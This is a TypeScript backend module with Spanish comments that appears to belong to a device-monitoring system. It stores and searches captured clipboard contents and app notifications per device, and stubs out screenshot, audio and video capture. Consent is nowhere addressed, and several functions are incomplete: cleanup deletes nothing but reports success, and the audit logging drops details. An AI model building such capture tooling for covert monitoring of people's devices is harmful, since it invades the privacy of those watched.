import { getDb } from "./db";
import {
  clipboardLogs,
  notificationLogs,
  devices,
  auditLogs,
} from "../drizzle/schema";
import { eq, and } from "drizzle-orm";

/**
 * Servicio de monitoreo activo avanzado
 * Gestiona clipboard logging, grabación de micrófono, screen recording y acceso a cámara
 */

export interface ClipboardEntry {
  deviceId: number;
  content: string;
  timestamp: Date;
  dataType: "text" | "image" | "url" | "file";
  contentPreview: string;
}

export interface NotificationCapture {
  deviceId: number;
  appName: string;
  title: string;
  content: string;
  timestamp: Date;
  isRead: boolean;
}

export interface MediaCapture {
  deviceId: number;
  type: "screenshot" | "audio" | "video";
  fileName: string;
  filePath: string;
  fileSize: number;
  duration?: number;
  timestamp: Date;
  thumbnail?: string;
}

export interface MonitoringStats {
  totalClipboardEntries: number;
  totalNotifications: number;
  totalMediaCaptures: number;
  clipboardByType: Record<string, number>;
  mediaByType: Record<string, number>;
  lastClipboardEntry?: Date;
  lastNotification?: Date;
  lastMediaCapture?: Date;
}

class AdvancedMonitoring {
  /**
   * Registrar entrada de clipboard
   */
  async logClipboardEntry(entry: ClipboardEntry): Promise<void> {
    const db = await getDb();
    if (!db) return;

    try {
      await db.insert(clipboardLogs).values({
        deviceId: entry.deviceId,
        content: entry.content,
        contentType: entry.dataType,
        timestamp: entry.timestamp,
      });

      // Registrar en auditoría
      await this.logAuditEvent(
        entry.deviceId,
        "CLIPBOARD_CAPTURED",
        `Clipboard capturado: ${entry.dataType}`,
        { dataType: entry.dataType, preview: entry.contentPreview }
      );
    } catch (error) {
      console.error("[AdvancedMonitoring] Error logging clipboard:", error);
    }
  }

  /**
   * Obtener historial de clipboard de un dispositivo
   */
  async getClipboardHistory(
    deviceId: number,
    limit: number = 100
  ): Promise<ClipboardEntry[]> {
    const db = await getDb();
    if (!db) return [];

    try {
      const logs = await db
        .select()
        .from(clipboardLogs)
        .where(eq(clipboardLogs.deviceId, deviceId))
        .orderBy((t) => t.timestamp)
        .limit(limit);

      return logs.map((log) => ({
        deviceId: log.deviceId,
        content: log.content || "",
        timestamp: log.timestamp || new Date(),
        dataType: (log.contentType || "text") as any,
        contentPreview: log.content?.substring(0, 100) || "",
      }));
    } catch (error) {
      console.error("[AdvancedMonitoring] Error getting clipboard history:", error);
      return [];
    }
  }

  /**
   * Registrar captura de notificación
   */
  async logNotification(notification: NotificationCapture): Promise<void> {
    const db = await getDb();
    if (!db) return;

    try {
      await db.insert(notificationLogs).values({
        deviceId: notification.deviceId,
        appName: notification.appName,
        title: notification.title,
        body: notification.content,
        timestamp: notification.timestamp,
      });

      // Registrar en auditoría
      await this.logAuditEvent(
        notification.deviceId,
        "NOTIFICATION_CAPTURED",
        `Notificación capturada de ${notification.appName}`,
        { appName: notification.appName, title: notification.title }
      );
    } catch (error) {
      console.error("[AdvancedMonitoring] Error logging notification:", error);
    }
  }

  /**
   * Obtener notificaciones capturadas
   */
  async getNotifications(
    deviceId: number,
    limit: number = 100
  ): Promise<NotificationCapture[]> {
    const db = await getDb();
    if (!db) return [];

    try {
      const notifications = await db
        .select()
        .from(notificationLogs)
        .where(eq(notificationLogs.deviceId, deviceId))
        .orderBy((t) => t.timestamp)
        .limit(limit);

      return notifications.map((notif) => ({
        deviceId: notif.deviceId,
        appName: notif.appName || "",
        title: notif.title || "",
        content: notif.body || "",
        timestamp: notif.timestamp || new Date(),
        isRead: false,
      }));
    } catch (error) {
      console.error("[AdvancedMonitoring] Error getting notifications:", error);
      return [];
    }
  }

  /**
   * Registrar captura de media (screenshot, audio, video)
   */
  async logMediaCapture(capture: MediaCapture): Promise<void> {
    const db = await getDb();
    if (!db) return;

    try {
      // Tabla mediaCaptures no existe aún
      // await db.insert(mediaCaptures).values({...});

      // Registrar en auditoría
      await this.logAuditEvent(
        capture.deviceId,
        "MEDIA_CAPTURED",
        `${capture.type} capturado: ${capture.fileName}`,
        {
          type: capture.type,
          fileName: capture.fileName,
          fileSize: capture.fileSize,
          duration: capture.duration,
        }
      );
    } catch (error) {
      console.error("[AdvancedMonitoring] Error logging media capture:", error);
    }
  }

  /**
   * Obtener capturas de media
   */
  async getMediaCaptures(
    deviceId: number,
    type?: "screenshot" | "audio" | "video",
    limit: number = 100
  ): Promise<MediaCapture[]> {
    const db = await getDb();
    if (!db) return [];

    try {
      // Tabla mediaCaptures no existe aún
      return [];

      // Retornar capturas vacías por ahora
      return [];
    } catch (error) {
      console.error("[AdvancedMonitoring] Error getting media captures:", error);
      return [];
    }
  }

  /**
   * Obtener estadísticas de monitoreo
   */
  async getMonitoringStats(deviceId: number): Promise<MonitoringStats> {
    const db = await getDb();
    if (!db) {
      return {
        totalClipboardEntries: 0,
        totalNotifications: 0,
        totalMediaCaptures: 0,
        clipboardByType: {},
        mediaByType: {},
      };
    }

    try {
      // Obtener clipboard entries
      const clipboardEntries = await db
        .select()
        .from(clipboardLogs)
        .where(eq(clipboardLogs.deviceId, deviceId));

      // Obtener notificaciones
      const notifications = await db
        .select()
        .from(notificationLogs)
        .where(eq(notificationLogs.deviceId, deviceId));

      // Obtener media captures
      // Obtener media captures (tabla no existe aún)
      const captures: any[] = [];

      // Contar por tipo
      const clipboardByType: Record<string, number> = {};
      clipboardEntries.forEach((entry) => {
        const type = entry.contentType || "unknown";
        clipboardByType[type] = (clipboardByType[type] || 0) + 1;
      });

      const mediaByType: Record<string, number> = {};
      // No hay capturas de media aún
      // captures.forEach((capture) => {
      //   const type = capture.type || "unknown";
      //   mediaByType[type] = (mediaByType[type] || 0) + 1;
      // });

      return {
        totalClipboardEntries: clipboardEntries.length,
        totalNotifications: notifications.length,
        totalMediaCaptures: captures.length,
        clipboardByType,
        mediaByType,
        lastClipboardEntry: clipboardEntries[clipboardEntries.length - 1]?.timestamp,
        lastNotification: notifications[notifications.length - 1]?.timestamp,
        lastMediaCapture: captures[captures.length - 1]?.timestamp,
      };
    } catch (error) {
      console.error("[AdvancedMonitoring] Error getting stats:", error);
      return {
        totalClipboardEntries: 0,
        totalNotifications: 0,
        totalMediaCaptures: 0,
        clipboardByType: {},
        mediaByType: {},
      };
    }
  }

  /**
   * Buscar en clipboard
   */
  async searchClipboard(
    deviceId: number,
    query: string
  ): Promise<ClipboardEntry[]> {
    const db = await getDb();
    if (!db) return [];

    try {
      const results = await db
        .select()
        .from(clipboardLogs)
        .where(
          and(
            eq(clipboardLogs.deviceId, deviceId),
            // Búsqueda en content o contentPreview
          )
        );

      return results
        .filter(
          (log) =>
            log.content && log.content.toLowerCase().includes(query.toLowerCase())
        )
        .map((log) => ({
          deviceId: log.deviceId,
          content: log.content || "",
          timestamp: log.timestamp || new Date(),
          dataType: (log.contentType || "text") as "text" | "image" | "url" | "file",
          contentPreview: log.content?.substring(0, 100) || "",
        }));
    } catch (error) {
      console.error("[AdvancedMonitoring] Error searching clipboard:", error);
      return [];
    }
  }

  /**
   * Eliminar capturas antiguas (limpieza)
   */
  async cleanupOldCaptures(deviceId: number, daysOld: number = 30): Promise<number> {
    const db = await getDb();
    if (!db) return 0;

    try {
      const cutoffDate = new Date();
      cutoffDate.setDate(cutoffDate.getDate() - daysOld);

      // Eliminar clipboard logs antiguos
      // await db.delete(clipboardLogs).where(eq(clipboardLogs.deviceId, deviceId));

      // Eliminar notificaciones antiguas
      // await db.delete(notificationLogs).where(eq(notificationLogs.deviceId, deviceId));

      // Eliminar media captures antiguas
      // await db.delete(mediaCaptures).where(eq(mediaCaptures.deviceId, deviceId));

      await this.logAuditEvent(
        deviceId,
        "CLEANUP_PERFORMED",
        `Limpieza de capturas más antiguas de ${daysOld} días`,
        { daysOld }
      );

      return 1;
    } catch (error) {
      console.error("[AdvancedMonitoring] Error cleaning up captures:", error);
      return 0;
    }
  }

  /**
   * Registrar evento en auditoría
   */
  private async logAuditEvent(
    deviceId: number,
    action: string,
    description: string,
    metadata?: Record<string, any>
  ): Promise<void> {
    const db = await getDb();
    if (!db) return;

    try {
      await db.insert(auditLogs).values({
        action: action,
        actionType: "security_event",
        deviceId: deviceId,
        timestamp: new Date(),
      });
    } catch (error) {
      console.error("[AdvancedMonitoring] Error logging audit event:", error);
    }
  }

  /**
   * Obtener resumen de actividad reciente
   */
  async getActivitySummary(deviceId: number, hoursBack: number = 24): Promise<{
    clipboardActivity: number;
    notificationActivity: number;
    mediaActivity: number;
    mostActiveApp: string | null;
    topClipboardTypes: Array<{ type: string; count: number }>;
  }> {
    const db = await getDb();
    if (!db) {
      return {
        clipboardActivity: 0,
        notificationActivity: 0,
        mediaActivity: 0,
        mostActiveApp: null,
        topClipboardTypes: [],
      };
    }

    try {
      // Obtener actividad reciente

      const recentClipboard = await db
        .select()
        .from(clipboardLogs)
        .where(eq(clipboardLogs.deviceId, deviceId));

      const recentNotifications = await db
        .select()
        .from(notificationLogs)
        .where(eq(notificationLogs.deviceId, deviceId));

      // Tabla mediaCaptures no existe aún
      const recentMedia: any[] = [];

      // Contar tipos de clipboard
      const typeCount: Record<string, number> = {};
      recentClipboard.forEach((entry) => {
        const type = entry.contentType || "text";
        typeCount[type] = (typeCount[type] || 0) + 1;
      });

      const topClipboardTypes = Object.entries(typeCount)
        .map(([type, count]) => ({ type, count }))
        .sort((a, b) => b.count - a.count)
        .slice(0, 5);

      // Encontrar app más activa
      const appActivity: Record<string, number> = {};
      recentNotifications.forEach((notif) => {
        const app = notif.appName || "unknown";
        appActivity[app] = (appActivity[app] || 0) + 1;
      });

      const mostActiveApp =
        Object.entries(appActivity).sort((a, b) => b[1] - a[1])[0]?.[0] || null;

      return {
        clipboardActivity: recentClipboard.length,
        notificationActivity: recentNotifications.length,
        mediaActivity: recentMedia.length,
        mostActiveApp,
        topClipboardTypes,
      };
    } catch (error) {
      console.error("[AdvancedMonitoring] Error getting activity summary:", error);
      return {
        clipboardActivity: 0,
        notificationActivity: 0,
        mediaActivity: 0,
        mostActiveApp: null,
        topClipboardTypes: [],
      };
    }
  }
}

// Exportar instancia singleton
export const advancedMonitoring = new AdvancedMonitoring();
